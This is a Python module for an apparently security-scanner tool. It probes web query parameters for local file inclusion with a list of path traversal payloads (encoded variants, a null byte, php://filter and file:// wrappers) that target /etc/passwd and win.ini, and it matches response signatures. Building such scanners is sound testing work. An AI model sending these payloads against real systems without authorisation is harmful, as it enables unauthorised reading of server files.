from __future__ import annotations

from icescan.checks.base import BaseCheck
from icescan.core.types import Finding, ScanContext, Surface, SurfaceKind, Severity
from icescan.core.surfaces import inject_into_url

PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "file:///etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
]

SIGS = ["root:x:0:0", "[extensions]", "daemon:", "/bin/bash", "nobody:x:"]
LFI_HINTS = ("file", "page", "path", "load", "template", "include", "doc", "view", "root", "dir", "read", "src", "download", "filename")


class LFI(BaseCheck):
    name = "lfi"
    category = "server"
    level = 2

    async def run_surface(self, ctx, surface):
        if surface.kind != SurfaceKind.QUERY:
            return []
        if not any(h in surface.name.lower() for h in LFI_HINTS):
            return []

        for payload in PAYLOADS:
            url = inject_into_url(surface.url, surface.name, payload)
            r = await ctx.client.get(url)
            if r.error:
                continue
            body = r.body or ""
            for sig in SIGS:
                if sig in body:
                    return [self.finding(
                        severity=Severity.HIGH,
                        url=url, method="GET", param=surface.name,
                        payload=payload,
                        evidence={"signature": sig, "snippet": body[:200]},
                        confidence="high",
                    )]
        return []
